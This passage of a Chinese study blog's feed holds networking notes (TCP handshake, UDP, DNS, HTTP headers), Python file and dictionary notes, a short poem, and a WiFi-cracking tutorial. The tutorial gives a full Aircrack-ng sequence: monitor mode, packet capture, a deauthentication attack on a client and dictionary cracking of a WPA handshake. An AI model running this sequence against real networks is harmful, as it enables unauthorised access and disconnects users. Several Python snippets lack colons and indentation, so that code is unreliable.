title="TCP&#x2F;IP协议"></a>TCP&#x2F;IP协议</h2><p>TCP&#x2F;IP协议是Internet最基本的协议、Internet国际互联网络的基础，由网络层的IP协议和传输层的TCP协议组成。通俗而言：<strong>TCP负责发现传输的问题，一有问题就发出信号，要求重新传输，直到所有数据安全正确地传输到目的地。而IP是给因特网的每一台联网设备规定一个地址。</strong></p><p>IP层接收由更低层（网络接口层例如以太网设备驱动程序）发来的数据包，并把该数据包发送到更高层—TCP或UDP层；相反，IP层也把从TCP或UDP层接收来的数据包传送到更低层。IP数据包是不可靠的，因为IP并没有做任何事情来确认数据包是否按顺序发送的或者有没有被破坏，IP数据包中含有发送它的主机的地址（源地址）和接收它的主机的地址（目的地址）。</p><p>TCP是面向连接的通信协议，通过三次握手建立连接，通讯完成时要拆除连接，由于TCP是面向连接的所以只能用于端到端的通讯。TCP提供的是一种可靠的数据流服务，采用“带重传的肯定确认”技术来实现传输的可靠性。TCP还采用一种称为“滑动窗口”的方式进行流量控制，所谓窗口实际表示接收能力，用以限制发送方的发送速度。</p><p><strong>TCP报文首部格式：</strong></p><p><img src="/images/tcp%E9%A6%96%E9%83%A8.png"></p><p><strong>TCP的三次握手和四次挥手：</strong></p><p><img src="/images/tcp%E6%8F%A1%E6%89%8B%E5%92%8C%E6%8C%A5%E6%89%8B.jpg"></p><p>注：seq:”sequance”序列号；ack:”acknowledge”确认号；SYN:”synchronize”请求同步标志；；ACK:”acknowledge”确认标志”；FIN：”Finally”结束标志。</p><p><strong>三次握手：</strong></p><ol><li>第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认；</li><li>第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态；</li><li>第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</li></ol><p><strong>四次挥手：</strong></p><ol><li>第一次挥手：主机1（可以使客户端，也可以是服务器端），设置Sequence Number和Acknowledgment Number，向主机2发送一个FIN报文段；此时，主机1进入FIN_WAIT_1状态；这表示主机1没有数据要发送给主机2了；</li><li>第二次挥手：主机2收到了主机1发送的FIN报文段，向主机1回一个ACK报文段，Acknowledgment Number为Sequence Number加1；主机1进入FIN_WAIT_2状态；主机2告诉主机1，我“同意”你的关闭请求；</li><li>第三次挥手：主机2向主机1发送FIN报文段，请求关闭连接，同时主机2进入LAST_ACK状态；</li><li>第四次挥手：主机1收到主机2发送的FIN报文段，向主机2发送ACK报文段，然后主机1进入TIME_WAIT状态；主机2收到主机1的ACK报文段以后，就关闭连接；此时，主机1等待2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，主机1也可以关闭连接了。</li></ol><p><strong>TCP连接建立过程：</strong>首先Client端发送连接请求报文，Server段接受连接后回复ACK报文，并为这次连接分配资源。Client端接收到ACK报文后也向Server段发生ACK报文，并分配资源，这样TCP连接就建立了。<br><strong>TCP连接断开过程：</strong>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p><p><strong>为什么要三次挥手？</strong><br>   在只有两次“握手”的情形下，假设Client想跟Server建立连接，但是却因为中途连接请求的数据报丢失了，故Client端不得不重新发送一遍；这个时候Server端仅收到一个连接请求，因此可以正常的建立连接。但是，有时候Client端重新发送请求不是因为数据报丢失了，而是有可能数据传输过程因为网络并发量很大在某结点被阻塞了，这种情形下Server端将先后收到2次请求，并持续等待两个Client请求向他发送数据…问题就在这里，Cient端实际上只有一次请求，而Server端却有2个响应，极端的情况可能由于Client端多次重新发送请求数据而导致Server端最后建立了N多个响应在等待，因而造成极大的资源浪费！所以，“三次握手”很有必要！<br><strong>为什么要四次挥手？</strong><br>　　试想一下，假如现在你是客户端你想断开跟Server的所有连接该怎么做？第一步，你自己先停止向Server端发送数据，并等待Server的回复。但事情还没有完，虽然你自身不往Server发送数据了，但是因为你们之前已经建立好平等的连接了，所以此时他也有主动权向你发送数据；故Server端还得终止主动向你发送数据，并等待你的确认。其实，说白了就是保证双方的一个合约的完整执行！</p><p>使用TCP的协议：<strong>FTP（文件传输协议）、Telnet（远程登录协议）、SMTP（简单邮件传输协议）、POP3（和SMTP相对，用于接收邮件）、HTTP协议等。</strong></p><h2 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h2><p><strong>UDP用户数据报协议，是面向无连接的通讯协议，UDP数据包括目的端口号和源端口号信息，由于通讯不需要连接，所以可以实现广播发送。UDP通讯时不需要接收方确认，属于不可靠的传输，可能会出现丢包现象，实际应用中要求程序员编程验证。</strong></p><p>UDP与TCP位于同一层，但它不管数据包的顺序、错误或重发。因此，UDP不被应用于那些使用虚电路的面向连接的服务，UDP主要用于那些面向查询—应答的服务，例如NFS。相对于FTP或Telnet，这些服务需要交换的信息量较小。</p><p>每个UDP报文分UDP报头和UDP数据区两部分。报头由四个16位长（2字节）字段组成，分别说明该报文的源端口、目的端口、报文长度以及校验值。UDP报头由4个域组成，其中每个域各占用2个字节，具体如下：<br>　　1. 源端口号；<br>　　2. 目标端口号；<br>　　3. 数据报长度；<br>　　4. 校验值。<br>使用UDP协议包括：<strong>TFTP（简单文件传输协议）、SNMP（简单网络管理协议）、DNS（域名解析协议）、NFS、BOOTP。</strong></p><p>TCP 与 UDP 的区别：TCP是面向连接的，可靠的字节流服务；UDP是面向无连接的，不可靠的数据报服务。</p><h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>DNS是域名系统(DomainNameSystem)的缩写，该系统用于命名组织到域层次结构中的计算机和网络服务，可以简单地理解为<strong>将URL转换为IP地址</strong>。域名是由圆点分开一串单词或缩写组成的，每一个域名都对应一个惟一的IP地址，在Internet上域名与IP地址之间是一一对应的，DNS就是进行域名解析的服务器。DNS命名用于Internet等TCP&#x2F;IP网络中，通过用户友好的名称查找计算机和服务。</p><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。</p><p>下面是一些最常见的请HTTP请求头概述 （HttpServletRequest）：</p><ul><li>Accept：浏览器可接受的MIME类型。</li><li>Accept-Charset：浏览器可接受的字符集。</li><li>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间。</li><li>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。</li><li>Authorization：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中。</li><li>Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep-Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入ByteArrayOutputStream，然后在正式写出内容之前计算它的大小。<br>Content-Length：表示请求消息正文的长度。</li><li>Cookie：这是最重要的请求头信息之一</li><li>From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它。</li><li>Host：初始URL中的主机和端口。</li><li>If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。</li><li>Pragma：指定“no-cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝。</li><li>Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。</li><li>User-Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。<br>UA-Pixels，UA-Color，UA-OS，UA-CPU：由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型。</li></ul><p>HTTP应答头概述（HttpServletResponse）：</p><p>Web服务器的HTTP应答一般由以下几项构成：一个状态行，一个或多个应答头，一个空行，内容文档。设置HTTP应答头往往和设置状态行中的状态代码结合起来。例如，有好几个表示“文档位置已经改变”的状态代码都伴随着一个Location头，而401（Unauthorized）状态代码则必须伴随一个WWW-Authenticate头。<br>然而，即使在没有设置特殊含义的状态代码时，指定应答头也是很有用的。应答头可以用来完成：设置Cookie，指定修改日期，指示浏览器按照指定的间隔刷新页面，声明文档的长度以便利用持久HTTP连接，……等等许多其他任务。<br>设置应答头最常用的方法是HttpServletResponse的setHeader，该方法有两个参数，分别表示应答头的名字和值。和设置状态代码相似，设置应答头应该在发送任何文档内容之前进行。<br>setDateHeader方法和setIntHeadr方法专门用来设置包含日期和整数值的应答头，前者避免了把Java时间转换为GMT时间字符串的麻烦，后者则避免了把整数转换为字符串的麻烦。<br>HttpServletResponse还提供了许多设置<br>setContentType：设置Content-Type头。大多数Servlet都要用到这个方法。<br>setContentLength：设置Content-Length头。对于支持持久HTTP连接的浏览器来说，这个函数是很有用的。<br>addCookie：设置一个Cookie（Servlet API中没有setCookie方法，因为应答往往包含多个Set-Cookie头）。<br>另外，如上节介绍，sendRedirect方法设置状态代码302时也会设置Location头。</p><p>HTTP应答头说明：</p><ul><li>Allow 服务器支持哪些请求方法（如GET、POST等）。</li><li>Content-Encoding 文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</li><li>Content-Length 表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入ByteArrayOutputStram，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</li><li>Content-Type 表示后面的文档属于什么MIME类型。Servlet默认为text&#x2F;plain，但通常需要显式地指定为text&#x2F;html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。<br>Date 当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</li><li>Expires 应该在什么时候认为文档已经过期，从而不再缓存它？</li><li>Last-Modified 文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</li><li>Location 表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</li><li>Refresh 表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader<br><code>(&quot;Refresh&quot;, &quot;5; URL=http://host/path&quot;)让浏览器读取指定的页面。注意这种功能通常是通过设置HTML页面HEAD区的&lt;META HTTP-EQUIV=&quot;Refresh&quot; CONTENT=&quot;5;URL=http://host/path&quot;&gt;</code>实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。注意Refresh的意义是“N秒之后刷新本页面或访问指定页面”，而不是“每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是&lt;META HTTP-EQUIV&#x3D;”Refresh” …&gt;。注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</li><li>Server 服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</li><li>Set-Cookie 设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。</li></ul><div style="position:absolute; bottom:0px; left:610px; width:76%;"><br>    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=406232&auto=1&height=66"></iframe><br></div>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Aircrack-ng进行WiFi密码破解</title>
    <link href="/blog/2018/08/23/%E4%BD%BF%E7%94%A8Aircrack-ng%E8%BF%9B%E8%A1%8CWiFi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <url>/blog/2018/08/23/%E4%BD%BF%E7%94%A8Aircrack-ng%E8%BF%9B%E8%A1%8CWiFi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><strong>今天来学习一下如何抓包破解WPA加密的WiFi。</strong></p><p><img src="/images/kali.jpg"></p><span id="more"></span><h2 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng"></a>Aircrack-ng</h2><p>Aircrack-ng是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA&#x2F;WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上（设备列表请参阅其官方网站）并嗅探802.11a，802.11b，802.11g的数据。</p><p>具体详情见百度<a href="https://baike.baidu.com/item/aircrack-ng/7661805" title="aircrack-ng">https://baike.baidu.com/item/aircrack-ng/7661805</a></p><h2 id="破解准备"><a href="#破解准备" class="headerlink" title="破解准备"></a>破解准备</h2><p>首先你需要一块无线网卡，kali虚拟机（为了方便直接使用，里面的小工具很多，不用再去自己下载了）</p><h3 id="1-查看你的网卡信息"><a href="#1-查看你的网卡信息" class="headerlink" title="1.查看你的网卡信息"></a>1.查看你的网卡信息</h3><p>在kali Linux下使用命令查看网卡信息。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure><p>效果图如下：<br><img src="/images/aircrack-ng.png"></p><p>可以看到里面有个wlan0，那就是我的网卡，如果没有的话就把无线网卡拔了再插一下，直到找到那个wlan0为止。一定要保证它<strong>现在没有连接到任何wifi</strong>，上面那个wlan0里面<strong>没有ip地址</strong>什么的就说明现在不在连接中。</p><h3 id="2-激活无线网卡至monitor即监听模式"><a href="#2-激活无线网卡至monitor即监听模式" class="headerlink" title="2.激活无线网卡至monitor即监听模式"></a>2.激活无线网卡至monitor即监听模式</h3><p>使用命令：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">airmon-ng <span class="hljs-literal">start</span> wlan0<br></code></pre></td></tr></table></figure><p>然后会出现以下提示信息：<br><img src="/images/aircrack-ng1.png"></p><p>如果再次使用ifconfig可以发现，我们的网卡已经被重命名为wlan0mon</p><p><strong>获取当前网络概况：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">airodump-ng wlan0mon<br></code></pre></td></tr></table></figure><p>其中wlan0mon是已经激活监听状态的网卡。</p><h3 id="3-探测无线网络，抓取无线数据包"><a href="#3-探测无线网络，抓取无线数据包" class="headerlink" title="3.探测无线网络，抓取无线数据包"></a>3.探测无线网络，抓取无线数据包</h3><p>具体命令如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">airodump</span>-ng -c <span class="hljs-number">11</span> -w longas wlan0mon<br></code></pre></td></tr></table></figure><p>参数解释：</p><ul><li>-c设置目标AP的工作频道</li><li>-w后面紧跟要保存的文件的文件名，注意：生成的文件名是longas-01.cap</li><li>wlan0mon：为之前已经开启监听的网卡名</li></ul><p>按Enter开始执行，不要关闭并打开另一个shell进行下一步</p><h3 id="4-进行deauth攻击加速破解过程"><a href="#4-进行deauth攻击加速破解过程" class="headerlink" title="4.进行deauth攻击加速破解过程"></a>4.进行deauth攻击加速破解过程</h3><p>输入命令：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">aireplay-ng -0 9 -a <span class="hljs-keyword">AP</span>的<span class="hljs-keyword">MAC</span> -c 客户端的<span class="hljs-keyword">mac</span> wlan0mon<br></code></pre></td></tr></table></figure><p>参数解释：</p><ul><li>-0：采用Deauth攻击模式，后面紧跟攻击次数，这里设置为9，大家可以根据实际情况设置</li><li>-a：后面跟AP的mac地址</li><li>-c：后面跟客户端的mac地址</li></ul><p>按Enter键后会出现以下信息：<br><img src="/images/aircrack-ng2.png"></p><p>然后回到抓取数据包的界面。在右上角出现handshake的提示证明获得了包含WPA-PSK密码的4次握手数据报文。如未出现，在此执行上述步骤。</p><p><img src="/images/aircrack-ng3.png"></p><h2 id="开始破解WPA-PSK"><a href="#开始破解WPA-PSK" class="headerlink" title="开始破解WPA-PSK"></a>开始破解WPA-PSK</h2><p>提前用字典生成器生成所需字典。</p><p>输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng -w dict.txt 捕获的.<span class="hljs-built_in">cap</span>文件<br></code></pre></td></tr></table></figure><p>按Enter执行后，经过一段时间便可破解，这取决于密码的强度。（为了方便演示，我故意将密码写在字典里）</p><p><img src="/images/aircrack-ng4.png"></p><p>Key Found！便是破解成功。</p><div style="position:absolute; bottom:0px; left:610px; width:76%;"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=300 height=86 src="//music.163.com/outchain/player?type=2&id=38592976&auto=1&height=66"></iframe></div>]]></content>
    
    
    
    <tags>
      
      <tag>无线渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python文件和数据格式化</title>
    <link href="/blog/2018/08/22/Python%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%96/"/>
    <url>/blog/2018/08/22/Python%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><strong>今天对Python基础语法进行最后一部分Python文件和数据格式化的学习，到此Python基础语法基本结束。</strong></p><p><img src="/images/fj9.jpg"></p><span id="more"></span><h2 id="文件的使用"><a href="#文件的使用" class="headerlink" title="文件的使用"></a>文件的使用</h2><h3 id="文件的类型"><a href="#文件的类型" class="headerlink" title="文件的类型"></a>文件的类型</h3><p><strong>文件是数据的抽象集合</strong></p><ul><li>文件是存储在辅助存储器上的数据序列</li><li>文件是数据存储的一种形式</li><li>文件展现形态：文本文件和二进制文件</li></ul><h3 id="文件的打开和关闭"><a href="#文件的打开和关闭" class="headerlink" title="文件的打开和关闭"></a>文件的打开和关闭</h3><p>&lt;变量名&gt; &#x3D; open(&lt;文件名&gt;,&lt;打开模式&gt;)<br>文件路径要注明，源文件同目录可省略</p><p><strong>打开模式：</strong><br><img src="/images/wenjian.png"></p><p><strong>文件关闭：</strong><br>&lt;变量名&gt;.close()</p><h3 id="文件内容的读取"><a href="#文件内容的读取" class="headerlink" title="文件内容的读取"></a>文件内容的读取</h3><table><thead><tr><th>操作方法</th><th>描述</th></tr></thead><tbody><tr><td>f.read(size&#x3D;-1)</td><td>读入全部内容，如果给出参数，读入该行前size长度</td></tr><tr><td>f.readline(size&#x3D;-1)</td><td>读入一行内容，如果给出参数，读入该行前size长度</td></tr><tr><td>f.readlines(hint&#x3D;-1)</td><td>读入文件所有行，以每行为元素形成列表，如果给出参数，读入前hint行</td></tr></tbody></table><p>遍历全文本：</p><ol><li><p>一次读入统一处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python">fname = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要打开的文件名称：&quot;</span>)<br>fo = <span class="hljs-built_in">open</span>(fname,<span class="hljs-string">&quot;r&quot;</span>)<br>txt = fo.read()<br>fo.close()<br></code></pre></td></tr></table></figure></li><li><p>按数量读入逐步处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Python">fname = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要打开的文件名称：&quot;</span>)<br>fo = <span class="hljs-built_in">open</span>(fname,<span class="hljs-string">&quot;r&quot;</span>)<br>txt = fo.read(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">while</span> txt != <span class="hljs-string">&quot; &quot;</span><br>txt = fo.read(<span class="hljs-number">2</span>)<br>fo.close()<br></code></pre></td></tr></table></figure></li><li><p>文件逐行遍历(一次读入分行处理)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">fname = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要打开的文件名称：&quot;</span>)<br>fo = <span class="hljs-built_in">open</span>(fname,<span class="hljs-string">&quot;r&quot;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> fo.readlines():<br><span class="hljs-built_in">print</span>(line)<br>fo.close()<br></code></pre></td></tr></table></figure></li><li><p>文件逐行遍历(分行读入)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">fname = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要打开的文件名称：&quot;</span>)<br>fo = <span class="hljs-built_in">open</span>(fname,<span class="hljs-string">&quot;r&quot;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> fo:<br><span class="hljs-built_in">print</span>(line)<br>fo.close()<br></code></pre></td></tr></table></figure></li></ol><h3 id="数据的文件写入"><a href="#数据的文件写入" class="headerlink" title="数据的文件写入"></a>数据的文件写入</h3><table><thead><tr><th>操作方法</th><th>描述</th></tr></thead><tbody><tr><td>f.write(s)</td><td>向文件写入一个字符串或字节流</td></tr><tr><td>f.writelines(lines)</td><td>将一个元素全为字符串的列表写入文件</td></tr><tr><td>f.seek(offset)</td><td>改变当前文件操作指针位置，offset含义如下：0-文件开头；1-当前位置；2-文件结尾；</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Encounter</title>
    <link href="/blog/2018/08/19/Encounter/"/>
    <url>/blog/2018/08/19/Encounter/</url>
    
    <content type="html"><![CDATA[<p>If we can only encounter each other</p><p>   rather than stay with each other,</p><p>then I wish we had never encountered.</p><p><img src="/images/encounter.jpg"></p>]]></content>
    
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python组合数据类型（二）</title>
    <link href="/blog/2018/08/19/Python%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/blog/2018/08/19/Python%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>今天继续学习一下Python组合数据类型。</strong><br><img src="/images/fj8.jpg"></p><span id="more"></span><h2 id="字典类型及操作"><a href="#字典类型及操作" class="headerlink" title="字典类型及操作"></a>字典类型及操作</h2><h2 id="字典类型定义"><a href="#字典类型定义" class="headerlink" title="字典类型定义"></a>字典类型定义</h2><p>映射：<strong>是一种键（索引）和值（数据）的对应</strong></p><h2 id="字典的建立"><a href="#字典的建立" class="headerlink" title="字典的建立"></a>字典的建立</h2><ul><li>赋值创建字典<br>  d&#x3D;{“key1”:”value1”,”key2”:”value2”}</li><li>工厂函数<br>  d&#x3D;dict(user1&#x3D;”123”,user2&#x3D;”234”,user3&#x3D;”345”)</li><li>内建方法:fromkeys<br>  d&#x3D;{}.fromkeys((‘username’,’password’),())</li><li>字典中的key有相同的value值,默认为None</li></ul><h3 id="基本字典操作方法"><a href="#基本字典操作方法" class="headerlink" title="基本字典操作方法"></a>基本字典操作方法</h3><ul><li>len(d)返回d中的键-值对的数量</li><li>d[k]返回关联到k上的值</li><li>d[k]&#x3D;v将值v关联到键k上</li><li>del d[k]删除键为k的项</li><li>k in d检查d中是否含有键为k项</li></ul><h3 id="字典方法"><a href="#字典方法" class="headerlink" title="字典方法"></a>字典方法</h3><p><strong>详见python基础教程P59.</strong></p><h2 id="jieba库的使用"><a href="#jieba库的使用" class="headerlink" title="jieba库的使用"></a>jieba库的使用</h2><h3 id="jieba库的基本介绍"><a href="#jieba库的基本介绍" class="headerlink" title="jieba库的基本介绍"></a>jieba库的基本介绍</h3><p>概述：jieba库是优秀的中文分词第三方库</p><ul><li>中文文本需要通过分词获得单个的词语</li><li>jieba是优秀的中文分词第三方库，需要额外安装</li><li>jieba库提供三种分词模式，最简单的只需掌握一个函数</li></ul><h3 id="jieba库的使用-1"><a href="#jieba库的使用-1" class="headerlink" title="jieba库的使用"></a>jieba库的使用</h3><ul><li>精确模式：把文本精确的分开，不存在冗余单词</li><li>全模式：把文本所有可能词语都扫描出来，有冗余</li><li>搜索引擎模式：在精确模式基础上，对长词再次切分</li></ul><p><img src="/images/jieba.png"></p><p><img src="/images/jieba1.png"></p><h2 id="实例：文本词频统计"><a href="#实例：文本词频统计" class="headerlink" title="实例：文本词频统计"></a>实例：文本词频统计</h2><h3 id="英文文本词频统计"><a href="#英文文本词频统计" class="headerlink" title="英文文本词频统计"></a>英文文本词频统计</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTxt</span>():<br>txt = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;hamlet.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br>txt = txt.lower()<br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;~!@#$%^&amp;*()_+&#123;&#125;[]|\:;&quot;&lt;&gt;,.?/-=`&#x27;</span><br>txt = txt.replace(ch,<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-keyword">return</span> txt<br><br>hamletTxt = getTxt()<br>words = hamletTxt.split()<br>counts = &#123;&#125;<br><span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:<br>counts[word] = counts.get(word,<span class="hljs-number">0</span>)+<span class="hljs-number">1</span><br><br>items = <span class="hljs-built_in">list</span>(counts.items())<br>items.sort(key=<span class="hljs-keyword">lambda</span> x:x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)<br>word,count = items[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;</span>.<span class="hljs-built_in">format</span>(word,count))<br></code></pre></td></tr></table></figure><h3 id="中文文本词频统计"><a href="#中文文本词频统计" class="headerlink" title="中文文本词频统计"></a>中文文本词频统计</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> jieba<br>txt = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;threekingdoms.txt&quot;</span>,<span 